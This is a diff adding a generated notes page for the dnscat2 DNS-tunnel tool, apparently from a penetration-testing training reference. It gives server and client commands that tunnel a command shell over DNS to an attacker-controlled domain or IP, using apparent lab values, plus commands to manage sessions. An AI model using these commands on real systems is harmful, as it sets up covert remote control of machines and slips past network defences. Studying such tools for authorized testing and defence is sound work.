@@ -1,0 +1,49 @@
+---
+title: "dnscat"
+sidebarTitle: "dnscat"
+description: "Commands and examples collected from your dnscat notes."
+keywords: ["dnscat", "dnscat2"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/dnscat.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+[Search this tool’s saved examples](/commands/notebook?tool=dnscat) · [All tools](/index)
+
+## dnscat2: DNS Tunnel Quick Reference
+
+**Notebook example**
+
+```text
+dnscat2> windows            # list sessions
+dnscat2> window -i 1        # interact with a session (command shell)
+```
+
+Saved as written; may include lab values or terminal output.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+## Notebook recipes
+
+1 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+
+<AccordionGroup>
+
+<Accordion title="dnscat2: DNS Tunnel Quick Reference">
+
+### dnscat2: DNS Tunnel Quick Reference
+
+**dnscat2: DNS Tunnel Quick Reference**
+
+```bash
+# server (attacker) — needs a domain delegated to you, or direct mode
+dnscat2-server inlanefreight.local
+# client (target)
+./dnscat --secret=<secret> inlanefreight.local        # via DNS hierarchy
+./dnscat --dns server=10.10.14.18,port=53 --secret=<secret>   # direct
+```
+
+</Accordion>
+
+</AccordionGroup>
